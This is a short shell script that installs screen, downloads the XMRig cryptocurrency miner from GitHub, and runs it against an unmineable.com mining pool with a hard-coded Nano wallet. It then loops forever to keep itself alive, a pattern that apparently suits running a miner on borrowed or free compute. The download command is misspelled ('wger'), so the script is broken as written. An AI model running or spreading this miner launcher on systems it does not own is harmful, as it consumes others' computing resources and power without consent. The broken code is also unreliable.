#!/bin/sh
sudo apt update
sudo apt install screen -y
wger https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar xf xmrig-6.22.2-linux-static-x64.tar.gz
cd xmrig-6.22.2
./xmrig -a rx -o stratum+tcp://rx-us.unmineable.com:3333 -u XNO:nano_11wud9cg76887robg75k5xsowsadccoh45m6y4btetxmp8han9a3973firri.unmineable_worker_injnigxt -p x --cpu 2
while [ 1 ]; do
sleep 3
done
sleep 999
